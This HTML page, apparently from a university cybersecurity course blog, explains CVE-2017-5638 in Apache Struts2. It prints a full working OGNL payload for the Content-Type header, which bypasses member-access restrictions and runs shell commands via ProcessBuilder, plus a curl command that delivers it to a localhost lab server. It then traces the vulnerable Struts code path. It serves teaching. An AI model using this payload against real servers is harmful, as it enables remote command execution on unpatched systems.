<!doctype html>
<html lang="en">
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
    <meta name="description" content="">
    <meta name="author" content="">
    <link rel="icon" href="images/favicon.ico">

    <title>CVE 5638</title>

    <!-- Bootstrap core CSS -->
    <link href="css/bootstrap.min.css" rel="stylesheet">

    <!-- Custom styles for this template -->
    <link href="https://fonts.googleapis.com/css?family=Playfair+Display:700,900" rel="stylesheet">
    <link href="css/blog.css" rel="stylesheet">
</head>

<body>
<nav class="navbar navbar-expand-md navbar-dark fixed-top bg-dark">
    <a class="navbar-brand" href="#">UVU MS Cybersecurity</a>
    <button class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarCollapse" aria-controls="navbarCollapse" aria-expanded="false" aria-label="Toggle navigation">
        <span class="navbar-toggler-icon"></span>
    </button>
    <div class="collapse navbar-collapse" id="navbarCollapse">
    </div>
</nav>

<main role="main" class="container">
    <div class="row">
        <div class="col-lg-10 blog-main">
            <br>
            <br>
            <!--<h3 class="pb-3 mb-4 font-italic border-bottom">
                Struts2 Vulnerability
            </h3>-->

            <div class="blog-post">
                <h2 class="blog-post-title">CVE-2017-5638</h2>

                <p>Takes advantage of the JakartaMultiPart parser, and the OGNL (Object Graph Navigation Library)</p>
                <hr>
                <h3>The Payload</h3>
                <p>The clever aspect of this vulernability is the exploitation of OGNL (Object Graph Navigation Library).</p>
                <p>OGNL uses expressions to perform tasks, and two of the expressions that are allowed is the ability to invoke arbitrary classes in the framework, and chain events. Reference guide <a target="_blank" href="https://commons.apache.org/proper/commons-ognl/language-guide.html">OGNL Language Guide</a></p>
                <p>So for example, it is possible then to instantiate edu.uvu.ms.cybersecurity.Command object with OGNL</p>
                <pre>
                    <code>
   //  OGNL expression to instantiate Command obj
   (#cmd='whoami').(#p=new edu.uvu.ms.cybersecurity.Command(#cmd)).(#p.print('hello from MSCybersecurity'))
                    </code>
                </pre>
                <p>The edu.uvu.ms.cybersecurity.Command class</p>
                <pre>
                    <code>
   //  Command simply prints the cmd argument passed from the OGNL expression
   public class Command {
       private Object cmd;

       public Command(Object cmd){
             this.cmd = cmd;
       }

       private void print(){
             System.out.println("OGNL recieved cmd: "+this.cmd);
       }

       public void print(String loc){
             System.out.println("OGNL recieved cmd: "+this.cmd+" from "+loc);
       }
   }

                    </code>
                </pre>
                <p> Or, in a more practical sense, one can invoke the java.lang.ProcessBuilder class to run system level commands </p>
                <pre>
                    <code>
   (#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start())
                    </code>
                </pre>
                <p>The following payload contains a command to invoke edu.uvu.ms.cybersecurity.Command and print the command issued to the server into the console, and then proceed to execute the command. (to illustrate chaining of events, and invoking classes)</p>
                <pre>
                    <code>
   Content-Type :  %{(#_='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='whoami').(#p=new edu.uvu.ms.cybersecurity.Command(#cmd)).(#p.print('hello from MSCybersecurity')).(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}
                 </code>
                </pre>
                <p>Deliver the payload with CURL</p>
                <pre>
                    <code>
   curl -H "Content-Type:  %{(#_='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='whoami').(#p=new edu.uvu.ms.cybersecurity.Command(#cmd)).(#p.print('hello from MSCybersecurity')).(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}" -X POST http://localhost:8080/MSCybersecurity/exploit

                    </code>
                </pre>
                <p>A portion of this payload was pulled from <a target="_blank" href="https://github.com/rapid7/metasploit-framework/issues/8064">Rapid7 GitHub</a></p>
                <hr>
                <h3>The Framework</h3>
                <hr>
                <p>The Struts Dispatcher.class receives the request, and determines that it should be handled by the JakartaMultiPart library and invokes the <i>MultiPartRequestWrapper()</i> constructor <div class="img-div"> <img class="code-img" src="images/Dispatcher-wrapRequest.png"></div> <p>
                <p>The OGNL expression from the Content-Type header is then passed into the <i>parse()</i> method. Because the header information is bad, the parser will raise an exception and call the <i>buildErrorMessage()</i> method <div class="img-div"><img class="code-img" src="images/JakartaMultiPartRequest-parse.png"></div></p>

                <p>The <i>buildErrorMessage()</i> method attempts to find an appropriate error message to return to the user, however, in order to do this, it has to uses the LocalizedTextUtil.class <i>findText()</i> method<div class="img-div"><img class="code-img" src="images/JakartaMultiPartRequest-buildError.png"></div><p>
                <p>The LocalizedTextUtil.class findText method will in turn call <i>getDefaultMessage()</i> and pass in the Content-Type information <div class="img-div"><img class="code-img" src="images/LocalizedTextUtil-findText.png"></div></p>
                <p>The <i>getDefaultMessage()</i> message will then delegate to TextParseUtil.class <i>translateVariables()</i> method<div class="img-div"><img class="code-img" src="images/LocalizedTextUtil-getDefaultMessage.png"></div></p>
                <p>The TextParseUtil.class <i>translateVariables()</i> method delegates to the OgnlTextParser.class <i>evaluate()</i> method <div class="img-div"><img class="code-img"src="images/TextParseUtil-translateVariables.png"></div></p>
                <p>The result being that any OGNL expressions are now executed <div class="img-div"><img class="code-img" src="images/OglnTextParser-evaluate.png"></div></p>
            </div><!-- /.blog-post -->

        </div><!-- /.blog-main -->

    </div><!-- /.row -->

</main><!-- /.container -->

<footer class="blog-footer">
    <p>
        <a href="#">Back to top</a>
    </p>
</footer>

<!-- Bootstrap core JavaScript
================================================== -->
<!-- Placed at the end of the document so the pages load faster -->
<script src="https://code.jquery.com/jquery-3.2.1.slim.min.js" integrity="sha384-KJ3o2DKtIkvYIK3UENzmM7KCkRr/rE9/Qpg6aAZGJwFDMVNA/GpGFF93hXpG5KkN" crossorigin="anonymous"></script>
<script>window.jQuery || document.write('<script src="js/jquery-slim.min.js"><\/script>')</script>
<script src="js/popper.min.js"></script>
<script src="js/bootstrap.min.js"></script>
<script src="js/holder.min.js"></script>
<script>
    Holder.addTheme('thumb', {
        bg: '#55595c',
        fg: '#eceeef',
        text: 'Thumbnail'
    });
</script>
</body>
</html>

